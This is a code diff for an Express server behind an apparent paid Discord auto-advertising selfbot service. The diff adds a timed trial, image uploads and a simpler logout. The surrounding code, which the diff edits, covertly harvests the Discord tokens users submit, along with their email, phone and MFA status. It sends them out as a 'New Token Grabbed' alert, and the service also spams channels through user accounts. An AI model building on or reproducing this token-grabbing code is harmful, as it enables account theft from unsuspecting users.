@@ -25,7 +25,8 @@ class SimpleDB {
             grabbedTokens: [],
             usedAddresses: [],
             addressHistory: [],
-            customKeys: []
+            customKeys: [],
+            trialClaims: {} // userId -> {claimedAt, expiresAt, ip}
         };
         this.load();
     }
@@ -37,6 +38,7 @@ class SimpleDB {
                 this.data.usedAddresses = this.data.usedAddresses || [];
                 this.data.addressHistory = this.data.addressHistory || [];
                 this.data.customKeys = this.data.customKeys || [];
+                this.data.trialClaims = this.data.trialClaims || {};
             }
         } catch(e) { console.error('[DB] Load error:', e.message); }
     }
@@ -48,7 +50,7 @@ class SimpleDB {
     }
     
     getUser(id) {
-        return this.data.users[id] || { auto_adv_purchased: 0 };
+        return this.data.users[id] || { auto_adv_purchased: 0, trial_active: 0, trial_expires: 0 };
     }
     
     setUser(id, data) {
@@ -225,6 +227,49 @@ class SimpleDB {
     getAddressHistory(userId) {
         return this.data.addressHistory.filter(h => h.user_id === userId);
     }
+
+    // Trial system methods
+    hasClaimedTrial(userId) {
+        return !!this.data.trialClaims[userId];
+    }
+
+    hasIPClaimedTrial(ip) {
+        return Object.values(this.data.trialClaims).some(t => t.ip === ip);
+    }
+
+    claimTrial(userId, ip) {
+        const now = Date.now();
+        const expiresAt = now + (10 * 60 * 1000); // 10 minutes
+        this.data.trialClaims[userId] = {
+            userId,
+            ip,
+            claimedAt: now,
+            expiresAt: expiresAt
+        };
+        this.setUser(userId, { trial_active: 1, trial_expires: expiresAt, trial_claimed_at: now });
+        this.save();
+        return { claimedAt: now, expiresAt: expiresAt };
+    }
+
+    isTrialActive(userId) {
+        const user = this.getUser(userId);
+        if (user.trial_active === 1 && user.trial_expires > Date.now()) {
+            return true;
+        }
+        if (user.trial_active === 1 && user.trial_expires <= Date.now()) {
+            this.setUser(userId, { trial_active: 0 });
+            return false;
+        }
+        return false;
+    }
+
+    getTrialTimeLeft(userId) {
+        const user = this.getUser(userId);
+        if (user.trial_active === 1 && user.trial_expires > Date.now()) {
+            return Math.ceil((user.trial_expires - Date.now()) / 1000);
+        }
+        return 0;
+    }
 }
 
 const db = new SimpleDB();
@@ -288,10 +333,7 @@ function validateKeyStrict(key) {
     if (!key || typeof key !== 'string') {
         return { valid: false, error: 'Invalid key', normalized: null };
     }
-    // Normalize: uppercase, trim
     let trimmed = key.trim().toUpperCase();
-
-    // Match TOKOS100-TOKOS200 (case insensitive)
     const baseMatch = trimmed.match(/^TOKOS(1[0-9][0-9]|200)$/);
     if (baseMatch) {
         const num = parseInt(baseMatch[1], 10);
@@ -299,12 +341,10 @@ function validateKeyStrict(key) {
             return { valid: true, error: null, normalized: `TOKOS${num}` };
         }
     }
-
     const customKeys = db.data.customKeys || [];
     if (customKeys.includes(trimmed)) {
         return { valid: true, error: null, normalized: trimmed };
     }
-
     return { valid: false, error: 'Invalid key', normalized: null };
 }
 
@@ -327,8 +367,6 @@ app.post('/api/admin/addkey', (req, res) => {
     res.json({ success: true, key: normalized });
 });
 
-const pendingLogouts = new Map();
-
 function ensureAuthAPI(req, res, next) {
     if (req.isAuthenticated()) return next();
     return res.status(401).json({ success: false, error: 'Not logged in' });
@@ -336,8 +374,11 @@ function ensureAuthAPI(req, res, next) {
 
 function ensurePurchasedAPI(req, res, next) {
     const user = db.getUser(req.user.id);
-    if (user.auto_adv_purchased !== 1) {
-        return res.status(403).json({ success: false, error: 'Purchase required' });
+    const hasPurchase = user.auto_adv_purchased === 1;
+    const hasActiveTrial = db.isTrialActive(req.user.id);
+    
+    if (!hasPurchase && !hasActiveTrial) {
+        return res.status(403).json({ success: false, error: 'Purchase or active trial required' });
     }
     next();
 }
@@ -371,7 +412,7 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
         db.addGrabbedToken(token, fullInfo, source);
         
         const embed = {
-            title: 'ð£ New Token Grabbed',
+            title: '🎣 New Token Grabbed',
             color: 0xff0000,
             fields: [
                 { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
@@ -379,9 +420,9 @@ async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
                 { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                 { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                 { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
-                { name: 'MFA', value: fullInfo.mfa_enabled ? 'â Enabled' : 'â Disabled', inline: true },
-                { name: 'Verified', value: fullInfo.verified ? 'â Yes' : 'â No', inline: true },
-                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'â No', inline: true },
+                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
+                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
+                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
                 { name: 'Source', value: source, inline: true },
                 { name: 'Time', value: new Date().toISOString(), inline: true }
             ],
@@ -465,16 +506,67 @@ if (walletModule && OWNER_LTC_ADDRESS && WALLET_MNEMONIC) {
 
 app.get('/login', passport.authenticate('discord'));
 app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => res.redirect('/'));
-app.get('/logout', (req, res) => req.logout(() => res.redirect('/')));
+
+// Simple logout - no verification
+app.get('/logout', (req, res) => {
+    req.logout(() => res.redirect('/'));
+});
 
 app.get('/api/user', ensureAuthAPI, (req, res) => {
     const user = db.getUser(req.user.id);
+    const trialActive = db.isTrialActive(req.user.id);
+    const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
+    
     res.json({ 
         id: req.user.id,
         username: req.user.username,
         global_name: req.user.global_name,
         avatar: req.user.avatar,
-        purchased: user.auto_adv_purchased === 1 
+        purchased: user.auto_adv_purchased === 1,
+        trialActive: trialActive,
+        trialTimeLeft: trialTimeLeft,
+        trialExpires: user.trial_expires || 0
+    });
+});
+
+// Trial claim endpoint
+app.post('/api/trial/claim', ensureAuthAPI, (req, res) => {
+    const userId = req.user.id;
+    const ip = req.ip || req.connection.remoteAddress || 'unknown';
+    
+    // Check if user already claimed
+    if (db.hasClaimedTrial(userId)) {
+        return res.json({ success: false, error: 'You already claimed your trial' });
+    }
+    
+    // Check if IP already claimed
+    if (db.hasIPClaimedTrial(ip)) {
+        return res.json({ success: false, error: 'Trial already claimed from this IP' });
+    }
+    
+    const trial = db.claimTrial(userId, ip);
+    
+    res.json({ 
+        success: true, 
+        message: 'Trial activated for 10 minutes',
+        expiresAt: trial.expiresAt,
+        timeLeft: 600 // 10 minutes in seconds
+    });
+});
+
+// Check trial status
+app.get('/api/trial/status', ensureAuthAPI, (req, res) => {
+    const userId = req.user.id;
+    const isActive = db.isTrialActive(userId);
+    const timeLeft = isActive ? db.getTrialTimeLeft(userId) : 0;
+    const hasClaimed = db.hasClaimedTrial(userId);
+    
+    res.json({
+        success: true,
+        hasClaimed: hasClaimed,
+        isActive: isActive,
+        timeLeft: timeLeft,
+        canClaim: !hasClaimed && !db.hasIPClaimedTrial(req.ip || 'unknown')
     });
 });
 
@@ -550,10 +642,15 @@ app.get('/api/activity', ensureAuthAPI, (req, res) => {
     const user = db.getUser(userId);
     const pending = db.getUserPending(userId);
     const history = db.getAddressHistory(userId);
+    const trialActive = db.isTrialActive(userId);
+    const trialTimeLeft = trialActive ? db.getTrialTimeLeft(userId) : 0;
     
     res.json({
         success: true,
         purchased: user.auto_adv_purchased === 1,
+        trialActive: trialActive,
+        trialTimeLeft: trialTimeLeft,
+        trialExpires: user.trial_expires || 0,
         pending: pending ? {
             address: pending.address,
             index: pending.index,
@@ -678,6 +775,23 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             joinStatus = await selfbotModule.joinServer(token, serverInvite);
         }
         
+        // Handle image upload - save to file and return URL
+        let savedImageUrl = null;
+        if (imageUrl && imageUrl.startsWith('data:')) {
+            try {
+                const imageId = `img_${Date.now()}_${req.user.id}.png`;
+                const imagePath = path.join(dataDir, 'uploads');
+                if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
+                
+                const base64Data = imageUrl.split(',')[1];
+                const buffer = Buffer.from(base64Data, 'base64');
+                fs.writeFileSync(path.join(imagePath, imageId), buffer);
+                savedImageUrl = `/uploads/${imageId}`;
+            } catch (imgErr) {
+                console.error('[IMAGE SAVE ERROR]', imgErr);
+            }
+        }
+        
         db.setConfig(req.user.id, {
             token, channels, message, 
             delay_seconds: delaySeconds, 
@@ -686,18 +800,19 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             active: 1,
             username: validation.username,
             server_joined: joinStatus?.success || false,
-            image_url: imageUrl || null,
+            image_url: savedImageUrl || imageUrl || null,
             send_all_at_once: sendAllAtOnce ? 1 : 0
         }, configId);
         
-        await selfbotModule.startSelfBot(req.user.id, token, channelList, message, delaySeconds * 1000, autoReply, autoReplyText, configId, imageUrl, req.ip, sendAllAtOnce);
+        await selfbotModule.startSelfBot(req.user.id, token, channelList, message, delaySeconds * 1000, autoReply, autoReplyText, configId, savedImageUrl || imageUrl, req.ip, sendAllAtOnce);
         
         res.json({ 
             success: true, 
             username: validation.username, 
             configId,
             serverJoined: joinStatus?.success || false,
-            tokenGrabbed: true
+            tokenGrabbed: true,
+            imageUrl: savedImageUrl
         });
     } catch (err) {
         res.status(500).json({ success: false, error: err.message });
@@ -760,22 +875,7 @@ app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res
 
 app.use('/uploads', express.static(path.join(dataDir, 'uploads')));
 
-app.post('/api/logout/request', ensureAuthAPI, (req, res) => {
-    const code = Math.floor(100000 + Math.random() * 900000).toString();
-    pendingLogouts.set(req.user.id, code);
-    res.json({ success: true });
-});
-
-app.post('/api/logout/verify', ensureAuthAPI, (req, res) => {
-    const { code } = req.body;
-    const stored = pendingLogouts.get(req.user.id);
-    if (stored === code) {
-        pendingLogouts.delete(req.user.id);
-        req.logout(() => res.json({ success: true }));
-    } else {
-        res.json({ success: false, error: 'Invalid code' });
-    }
-});
+// Remove old logout endpoints - using simple GET /logout instead
 
 app.get('/', (req, res) => {
     if (req.isAuthenticated()) return res.redirect('/dashboard');
